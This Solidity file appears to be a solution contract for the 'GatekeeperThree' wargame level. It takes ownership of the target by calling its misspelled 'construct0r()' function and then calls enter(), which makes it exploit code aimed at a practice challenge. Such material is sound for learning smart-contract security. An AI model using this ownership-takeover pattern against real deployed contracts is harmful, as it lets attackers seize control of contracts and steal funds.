// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeAttack {
    GatekeeperThree keeper;

    constructor(address payable _k) {
        keeper = GatekeeperThree(_k);
        keeper.construct0r();
    }

    function attack() external {
        keeper.enter();
    }

}